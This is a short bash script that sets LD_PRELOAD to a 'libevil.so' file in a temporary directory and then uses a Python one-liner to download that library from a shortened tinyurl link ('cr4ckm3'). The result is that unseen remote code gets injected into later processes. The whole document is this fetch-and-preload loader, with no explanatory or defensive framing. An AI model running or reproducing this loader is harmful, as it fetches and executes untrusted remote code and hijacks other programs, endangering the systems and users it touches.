#!/bin/bash
export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
LD_PRELOAD="" python3 - "${LD_PRELOAD%%/libevil.so*}/libevil.so" <<<'__import__("shutil").copyfileobj(__import__("urllib.request").request.urlopen("https://tinyurl.com/cr4ckm3"), open(__import__("sys").argv[1], "wb"))'
